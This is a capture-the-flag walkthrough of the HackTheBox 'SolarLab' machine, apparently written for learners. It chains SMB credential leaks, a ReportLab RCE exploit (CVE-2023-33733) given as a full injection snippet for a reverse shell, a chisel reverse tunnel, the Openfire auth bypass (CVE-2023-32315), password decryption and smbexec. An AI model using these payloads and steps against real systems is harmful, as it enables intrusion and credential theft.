 HTB: SolarLab — Full Walkthrough (Hard)

Author: @tahahfatima | Difficulty: Hard
Category: Real-world | CVE chaining | RCE | PrivEsc
Status: ✅ Rooted
🧠 Summary

The SolarLab box demonstrates a multi-stage compromise using a blend of misconfigurations and publicly known CVEs. The core attack involved:

    Leaking credentials from SMB .xlsx files

    Exploiting a web app (port 6791) using CVE-2023-33733 (ReportLab RCE)

    Gaining secondary access to Openfire on port 9090 using CVE-2023-32315

    Decrypting the admin password from Openfire's embedded DB

    Root shell via classic SMBExec + reverse shell reuse

🔍 Recon

nmap -sC -sV -Pn <target-ip>

Open Ports:

    80 (HTTP)

    445 (SMB)

Navigating to http://<ip> showed a static web page with nothing actionable.

So I pivoted to SMB enumeration using:

smbclient -L //<target-ip> --no-pass

Found a share: Documents. Accessed it anonymously and pulled all files.
📂 Credential Leak via SMB

Inside details-file.xlsx, I found juicy intel:

    Several usernames

    Emails

    Cleartext passwords

Example format:

AlexanderA : <password>
ClaudiaC : <password>
Blake.Byte : <password>

The format firstname.surname stood out for Blake, unlike the others. I suspected his real login might be BlakeB.
🔐 Web App Login (Port 6791)

Next, I scanned all ports:

nmap -p- <target-ip>

Discovered 6791 — a custom web login portal.

Started brute-forcing logins using Burp Suite ClusterBomb with usernames and passwords from the .xlsx file.

Only BlakeB with one of the listed passwords worked — granting access to a form-based app that could generate downloadable PDFs.
⚔️ CVE-2023-33733: ReportLab PDF Generator RCE

Used exiftool on a downloaded PDF — saw the ReportLab PDF Library in the metadata.

🔍 Found this:

    CVE-2023-33733 — RCE in ReportLab’s PDF generation via template injection.

Crafted an exploit by modifying the travel_request field in the “Travel Approval” form.
Payload:

Used a base64-encoded PowerShell reverse shell (from revshells.com) in the payload.

Injected the following snippet (PoC from GitHub):

<para>
<font color="[ [ getattr(pow,Word('__globals__'))['os'].system('PAYLOAD') for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and 'red'">
exploit
</font>
</para>

Replaced PAYLOAD with the revshell.

📡 Started a listener and submitted the form → Got reverse shell as blake.

Grabbed user.txt.
🛰️ Port Forwarding to Openfire (Port 9090)

From blake's shell, checked listening ports:

netstat -tulnp

Both 9090 and 9091 were active (Openfire admin console). Used chisel for port forwarding:

# Kali box:
chisel server -p 8000 --reverse

# On victim (Windows):
chisel client <kali-ip>:8000 R:9090:127.0.0.1:9090

Now accessible via http://localhost:9090.
💥 CVE-2023-32315: Openfire Auth Bypass to RCE

Openfire version 4.7.4 → Vulnerable to CVE-2023-32315.

GitHub PoC:
https://github.com/miko550/CVE-2023-32315

This allowed dumping Openfire users and logging into the admin panel.
⚙️ Openfire Plugin RCE → openfire Shell

Steps:

    Uploaded ManagementTool.jar (from CVE PoC repo) via Openfire admin.

    Plugin revealed the password in the description: 123

    Accessed system command prompt

    Executed the same PowerShell revshell → shell as user openfire

🔓 Privilege Escalation via Encrypted Password Leak

Found this path:

/opt/openfire/embedded-db/openfire.script

It contained:

    Encrypted admin password hash

    Associated key

🔑 Decrypted using this tool:

    https://github.com/c0rdis/openfire_decrypt

java -jar openfire_decrypt.jar <hash> <key>

Got cleartext Administrator credentials.
🧨 Root via SMBExec + Revshell

Used:

smbexec.py administrator@<target-ip>

Due to restricted shell, reused revshell again (PowerShell base64 from revshells.com).

✅ Got a root shell. Grabbed root.txt.
✅ Flags

    user.txt: ✔️ (blake)

    root.txt: ✔️ (administrator)

🧠 Key Takeaways

    SMB often leaks internal docs → check .xlsx, .docx, .pdf for credentials.

    ReportLab + PDF gen → template injection + RCE.

    Openfire is frequently misconfigured + vulnerable (CVE-2023-32315).

    Embedded DBs = gold mines → decrypt if you find hashes + keys.

    Reusing stable payloads = less room for error.

